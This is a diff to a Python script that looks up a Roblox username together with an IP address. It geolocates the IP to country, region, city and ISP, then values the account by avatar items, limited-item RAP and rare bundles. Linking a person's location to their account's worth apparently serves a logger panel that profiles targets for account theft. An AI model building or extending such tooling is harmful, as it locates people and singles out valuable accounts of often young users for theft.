@@ -28,7 +28,7 @@ def req_json(url, method="GET", body=None):
         req = urllib.request.Request(url, data=body, headers=HEADERS, method=method)
         if body:
             req.add_header("Content-Type", "application/json")
-        with urllib.request.urlopen(req, timeout=5) as resp:
+        with urllib.request.urlopen(req, timeout=6) as resp:
             return resp.status, json.loads(resp.read().decode("utf-8"))
     except Exception:
         return 0, {}
@@ -36,23 +36,35 @@ def req_json(url, method="GET", body=None):
 def get_detail(usn, ip=""):
     out = {
         "usn": usn,
+        "display_name": usn,
         "ip": ip,
         "uid": None,
         "created": "-",
-        "description": "",
         "is_banned": False,
         "is_private": False,
         "has_verified": False,
         "total_rap": 0,
         "bundle_value": 0,
         "items": [],
+        "worn_items": [],
         "avatar": "",
+        "country": "",
+        "country_code": "",
+        "region": "",
+        "city": "",
+        "isp": "",
         "location": "-"
     }
     if ip:
-        st_ip, ip_data = req_json(f"http://ip-api.com/json/{ip}?fields=status,country,city")
+        st_ip, ip_data = req_json(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp")
         if st_ip == 200 and ip_data.get("status") == "success":
-            out["location"] = f"{ip_data.get('country', '')} ({ip_data.get('city', '')})".strip(" ()")
+            out["country"] = ip_data.get("country") or ""
+            out["country_code"] = ip_data.get("countryCode") or ""
+            out["region"] = ip_data.get("regionName") or ""
+            out["city"] = ip_data.get("city") or ""
+            out["isp"] = ip_data.get("isp") or ""
+            parts = [p for p in [out["country"], out["region"], out["city"]] if p]
+            out["location"] = " • ".join(parts) if parts else "-"
 
     payload = json.dumps({"usernames": [usn], "excludeBannedUsers": False}).encode("utf-8")
     st_u, u_data = req_json("https://users.roblox.com/v1/usernames/users", "POST", payload)
@@ -62,11 +74,12 @@ def get_detail(usn, ip=""):
 
     uid = users[0].get("id")
     out["uid"] = uid
+    out["display_name"] = users[0].get("displayName") or usn
 
     st_p, prof = req_json(f"https://users.roblox.com/v1/users/{uid}")
     if st_p == 200 and isinstance(prof, dict):
         out["created"] = (prof.get("created") or "-")[:10]
-        out["description"] = prof.get("description") or ""
+        out["display_name"] = prof.get("displayName") or out["display_name"]
         out["is_banned"] = bool(prof.get("isBanned"))
 
     st_th, th = req_json(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false")
@@ -75,9 +88,13 @@ def get_detail(usn, ip=""):
 
     st_av, av = req_json(f"https://avatar.roblox.com/v1/users/{uid}/avatar")
     found_names = set()
+    worn_assets = []
     if st_av == 200 and isinstance(av, dict):
         for a in av.get("assets", []):
             aid = a.get("id")
+            aname = a.get("name") or "Item"
+            if aid:
+                worn_assets.append({"id": aid, "name": aname, "image": ""})
             if aid in VERIFIED_IDS:
                 out["has_verified"] = True
             if aid in SPECIAL_ASSETS:
@@ -86,6 +103,18 @@ def get_detail(usn, ip=""):
                     found_names.add(nm)
                     out["bundle_value"] += val
                     out["items"].append({"name": nm, "rap": val, "type": "Special / Bundle"})
+
+    if worn_assets:
+        ids_str = ",".join(str(x["id"]) for x in worn_assets[:15])
+        st_ath, ath = req_json(f"https://thumbnails.roblox.com/v1/assets?assetIds={ids_str}&size=150x150&format=Png&isCircular=false")
+        img_map = {}
+        if st_ath == 200 and isinstance(ath, dict):
+            for t in ath.get("data", []):
+                if t.get("targetId") and t.get("imageUrl"):
+                    img_map[t["targetId"]] = t["imageUrl"]
+        for wa in worn_assets:
+            wa["image"] = img_map.get(wa["id"], "")
+        out["worn_items"] = worn_assets
 
     if not out["has_verified"]:
         for vid in VERIFIED_IDS:
@@ -103,26 +132,6 @@ def get_detail(usn, ip=""):
             rap = int(it.get("recentAveragePrice") or 0)
             out["total_rap"] += rap
             out["items"].append({"name": nm, "rap": rap, "type": "Limited"})
-
-    st_b, bd = req_json(f"https://catalog.roblox.com/v1/users/{uid}/bundles?limit=100&sortOrder=Desc")
-    if st_b == 200 and isinstance(bd, dict):
-        for b in bd.get("data", []):
-            bid = b.get("id")
-            bname = b.get("name", "")
-            if bid == 192 or "korblox" in bname.lower():
-                if "Korblox Deathspeaker" not in found_names:
-                    found_names.add("Korblox Deathspeaker")
-                    out["bundle_value"] += 17000
-                    out["items"].append({"name": "Korblox Deathspeaker", "rap": 17000, "type": "Bundle"})
-            elif bid == 201 or "headless" in bname.lower():
-                if "Headless Horseman" not in found_names:
-                    found_names.add("Headless Horseman")
-                    out["bundle_value"] += 31000
-                    out["items"].append({"name": "Headless Horseman", "rap": 31000, "type": "Bundle"})
-            elif "malivinius" in bname.lower():
-                if bname not in found_names:
-                    found_names.add(bname)
-                    out["items"].append({"name": bname, "rap": 0, "type": "Bundle"})
 
     return out
 
